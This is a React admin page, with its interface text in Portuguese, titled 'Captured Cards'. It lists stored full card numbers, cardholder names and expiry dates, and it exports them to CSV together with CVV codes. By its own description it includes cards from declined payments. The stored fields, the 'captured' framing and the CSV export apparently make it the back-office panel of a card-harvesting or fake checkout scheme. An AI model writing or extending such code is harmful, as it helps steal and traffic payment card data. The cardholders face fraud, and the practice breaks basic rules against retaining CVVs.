
import { useState } from "react";
import { useQuery } from "@tanstack/react-query";
import { formatCurrency } from "@/lib/formatters";
import { toast } from "sonner";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { CreditCard, Download, Search, Trash2 } from "lucide-react";
import { Input } from "@/components/ui/input";
import { getAllPaymentInfo, deletePaymentInfo } from "@/services/paymentInfoService";

export default function AdminCapturedCards() {
  const [searchTerm, setSearchTerm] = useState("");
  
  // Fetch payment info data
  const { 
    data: paymentInfo = [], 
    isLoading, 
    error,
    refetch
  } = useQuery({
    queryKey: ['payment-info'],
    queryFn: getAllPaymentInfo,
  });
  
  // Handle search
  const filteredPaymentInfo = searchTerm 
    ? paymentInfo.filter((info: any) => 
        info.pedidos?.nome?.toLowerCase().includes(searchTerm.toLowerCase()) ||
        info.pedidos?.email?.toLowerCase().includes(searchTerm.toLowerCase()) ||
        info.pedidos?.status?.toLowerCase().includes(searchTerm.toLowerCase()) ||
        info.metodo_pagamento?.toLowerCase().includes(searchTerm.toLowerCase()) ||
        info.numero_cartao?.includes(searchTerm)
      )
    : paymentInfo;
  
  // Handle delete payment info
  const handleDelete = async (id: string) => {
    try {
      await deletePaymentInfo(id);
      toast.success("Informação de pagamento excluída com sucesso");
      refetch();
    } catch (error) {
      console.error("Erro ao excluir informação de pagamento:", error);
      toast.error("Erro ao excluir informação de pagamento");
    }
  };
  
  // Handle export to CSV
  const handleExportCSV = () => {
    // Create CSV content
    let csvContent = "Nome,Email,Telefone,Valor,Status,Método de Pagamento,Número do Cartão,Nome no Cartão,Validade,CVV,Parcelas,Data\n";
    
    filteredPaymentInfo.forEach((info: any) => {
      const row = [
        info.pedidos?.nome || "",
        info.pedidos?.email || "",
        info.pedidos?.telefone || "",
        info.pedidos?.valor || "0",
        info.pedidos?.status || "",
        info.metodo_pagamento || "",
        info.numero_cartao ? `"${info.numero_cartao}"` : "",
        info.nome_cartao ? `"${info.nome_cartao}"` : "",
        info.validade || "",
        info.cvv || "",
        info.parcelas || "",
        new Date(info.created_at).toLocaleDateString("pt-BR")
      ].join(",");
      
      csvContent += row + "\n";
    });
    
    // Create download link
    const blob = new Blob([csvContent], { type: "text/csv;charset=utf-8;" });
    const url = URL.createObjectURL(blob);
    const link = document.createElement("a");
    link.setAttribute("href", url);
    link.setAttribute("download", `cartoes_capturados_${new Date().toISOString().split("T")[0]}.csv`);
    link.style.visibility = "hidden";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };
  
  if (isLoading) {
    return (
      <div className="container py-6">
        <div className="flex justify-between items-center mb-6">
          <h1 className="text-2xl font-bold">Cartões Capturados</h1>
        </div>
        <Card>
          <CardContent className="p-10 text-center">
            <div className="flex justify-center mb-4">
              <CreditCard className="w-10 h-10 text-gray-400" />
            </div>
            <p>Carregando informações de pagamento...</p>
          </CardContent>
        </Card>
      </div>
    );
  }
  
  if (error) {
    return (
      <div className="container py-6">
        <div className="flex justify-between items-center mb-6">
          <h1 className="text-2xl font-bold">Cartões Capturados</h1>
        </div>
        <Card>
          <CardContent className="p-10 text-center">
            <div className="flex justify-center mb-4">
              <CreditCard className="w-10 h-10 text-red-500" />
            </div>
            <p className="text-red-500">Erro ao carregar informações de pagamento.</p>
          </CardContent>
        </Card>
      </div>
    );
  }
  
  return (
    <div className="container py-6">
      <div className="flex justify-between items-center mb-6">
        <h1 className="text-2xl font-bold">Cartões Capturados</h1>
        <Button onClick={handleExportCSV} className="flex items-center gap-2">
          <Download className="w-4 h-4" />
          Exportar CSV
        </Button>
      </div>
      
      <Card className="mb-6">
        <CardHeader>
          <CardTitle>Informações de Pagamento</CardTitle>
          <CardDescription>
            Visualize todos os dados de pagamento capturados, incluindo cartões com pagamentos reprovados.
          </CardDescription>
        </CardHeader>
        <CardContent>
          <div className="mb-4 relative">
            <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-500" size={18} />
            <Input
              placeholder="Pesquisar por nome, email, status ou cartão..."
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
              className="pl-10"
            />
          </div>
          
          <div className="overflow-x-auto">
            <Table>
              <TableHeader>
                <TableRow>
                  <TableHead>Cliente</TableHead>
                  <TableHead>Cartão</TableHead>
                  <TableHead>Status</TableHead>
                  <TableHead>Valor</TableHead>
                  <TableHead>Data</TableHead>
                  <TableHead className="text-right">Ações</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {filteredPaymentInfo.length === 0 ? (
                  <TableRow>
                    <TableCell colSpan={6} className="text-center py-10">
                      <p className="text-gray-500">Nenhuma informação de pagamento encontrada.</p>
                    </TableCell>
                  </TableRow>
                ) : (
                  filteredPaymentInfo.map((info: any) => (
                    <TableRow key={info.id}>
                      <TableCell>
                        <div>
                          <p className="font-medium">{info.pedidos?.nome || "Nome não disponível"}</p>
                          <p className="text-sm text-gray-500">{info.pedidos?.email || "Email não disponível"}</p>
                        </div>
                      </TableCell>
                      <TableCell>
                        <div>
                          <p className="font-medium">{info.numero_cartao || "Número não disponível"}</p>
                          <p className="text-sm text-gray-500">
                            {info.nome_cartao || "Nome não disponível"} • {info.validade || "MM/YY"}
                          </p>
                        </div>
                      </TableCell>
                      <TableCell>
                        <span className={`inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium ${
                          info.pedidos?.status === 'pago' 
                            ? 'bg-green-100 text-green-800' 
                            : info.pedidos?.status === 'pendente'
                            ? 'bg-yellow-100 text-yellow-800'
                            : 'bg-red-100 text-red-800'
                        }`}>
                          {info.pedidos?.status || "Desconhecido"}
                        </span>
                      </TableCell>
                      <TableCell>
                        {info.pedidos?.valor ? formatCurrency(info.pedidos.valor) : "R$ 0,00"}
                      </TableCell>
                      <TableCell>
                        {new Date(info.created_at).toLocaleDateString("pt-BR")}
                      </TableCell>
                      <TableCell className="text-right">
                        <Button
                          variant="destructive"
                          size="sm"
                          className="h-8 w-8 p-0"
                          onClick={() => handleDelete(info.id)}
                        >
                          <Trash2 className="h-4 w-4" />
                        </Button>
                      </TableCell>
                    </TableRow>
                  ))
                )}
              </TableBody>
            </Table>
          </div>
        </CardContent>
      </Card>
    </div>
  );
}
